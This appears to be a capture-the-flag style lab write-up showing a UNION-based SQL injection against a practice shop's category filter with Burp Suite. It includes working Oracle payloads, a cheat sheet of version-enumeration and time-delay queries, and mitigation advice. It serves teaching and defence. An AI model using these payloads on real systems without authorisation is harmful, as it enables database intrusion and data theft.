# Step 1: Start the lab

Click **ACCESS THE LAB**.

Wait until the vulnerable shopping application opens.

---

# Step 2: Capture the request

1. Open **Burp Suite**.
2. Go to **Proxy → Intercept**.
3. Turn **Intercept ON**.
4. In the browser, click any **product category** (for example: Gifts, Pets, Tech).

Burp should capture a request similar to:

```
GET /filter?category=Lifestyle'HTTP/2
Host: 0aaa00d4031668f180541264001200a4.web-security-academy.net
Cookie: session=1w2jyj3dEobN2hKnYEzNim85YOEWq8H6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa00d4031668f180541264001200a4.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

The important part is the **category** parameter.

---

# Step 3: Send to Repeater

Right-click the intercepted request.

Choose:

```
Send to Repeater
```

Then click the **Repeater** tab.

---

# Step 4: insert following

Near the top of the request you'll see something like:

```
GET /filter?category=Lifestyle'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
```

<img width="1277" height="769" alt="Screenshot 2026-08-03 at 11 49 48 AM" src="https://github.com/user-attachments/assets/00f793bf-f89b-4ab9-b225-7f6cc8183871" />


Next:

something like:

```
GET /filter?category=Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--$ HTTP/2
```


<img width="1280" height="736" alt="Screenshot 2026-08-03 at 11 51 19 AM" src="https://github.com/user-attachments/assets/af3a688b-f12a-4960-89bc-b6348a96299c" />

# Now Refresh

<img width="1275" height="724" alt="Screenshot 2026-08-03 at 11 53 35 AM" src="https://github.com/user-attachments/assets/6fb96045-067c-4c81-9783-9e373e0e517e" />


## SQL Injection Cheat Sheet – Database Version Enumeration

| **Database** | **Query to Retrieve Version** | **Example Output** | **Purpose** |
| --- | --- | --- | --- |
| **Oracle** | `SELECT banner FROM v$version` | `Oracle Database 19c Enterprise Edition Release 19.0.0.0.0` | Retrieves detailed Oracle version information from the `v$version` view. |
| **Oracle (Alternative)** | `SELECT version FROM v$instance` | `19.0.0.0.0` | Retrieves the Oracle instance version only. |
| **Microsoft SQL Server** | `SELECT @@version` | `Microsoft SQL Server 2022 (RTM) - 16.0.1000.6` | Displays the SQL Server version, edition, OS, and build information. |
| **PostgreSQL** | `SELECT version()` | `PostgreSQL 16.3 on x86_64-pc-linux-gnu` | Returns PostgreSQL version along with platform and compiler information. |
| **MySQL** | `SELECT @@version` | `8.0.42` | Returns the current MySQL server version. |

---

## Quick Reference Table

| **Database** | **Version Query** |
| --- | --- |
| Oracle | `SELECT banner FROM v$version` |
| Oracle (Alternative) | `SELECT version FROM v$instance` |
| Microsoft SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

---

## Why Do Penetration Testers Check the Database Version?

Determining the database version helps identify:

- **Database type** (Oracle, PostgreSQL, MySQL, SQL Server).
- **Database version**, which influences available SQL functions and syntax.
- **Database-specific payloads** to use in authorized testing (for example, different functions for string concatenation, time delays, or metadata queries).
- **Potentially outdated software**, which may require security updates (reported as a finding if relevant and within scope).

For example:

| **Database** | **Time Delay Function** |
| --- | --- |
| Oracle | `dbms_pipe.receive_message()` |
| Microsoft SQL Server | `WAITFOR DELAY` |
| PostgreSQL | `pg_sleep()` |
| MySQL | `SLEEP()` |

Knowing the database version allows an authorized tester to choose the correct database-specific syntax during an assessment.

# Mitigation

To prevent **UNION-based SQL Injection** vulnerabilities:

* Use **parameterized queries (prepared statements)** instead of concatenating user input into SQL queries.
* Validate and sanitize user input using **allow-list validation** where appropriate.
* Avoid constructing dynamic SQL queries with untrusted input.
* Apply the **principle of least privilege** to database accounts.
* Return **generic error messages** without exposing database details.
* Keep the application, database, and dependencies **up to date**.
* Use a **Web Application Firewall (WAF)** as an additional layer of defense.

---

#💡 Lessons Learned

* User-controlled input should never be trusted.
* UNION-based SQL Injection allows attackers to retrieve data from unintended database tables.
* Determining the correct number of columns and compatible data types is essential for successful UNION attacks.
* Parameterized queries are the most effective defense against SQL Injection.
* Verbose database errors can help attackers identify the database type and refine their payloads.
* Burp Suite is an effective tool for identifying and testing SQL Injection vulnerabilities in a controlled and authorized environment.

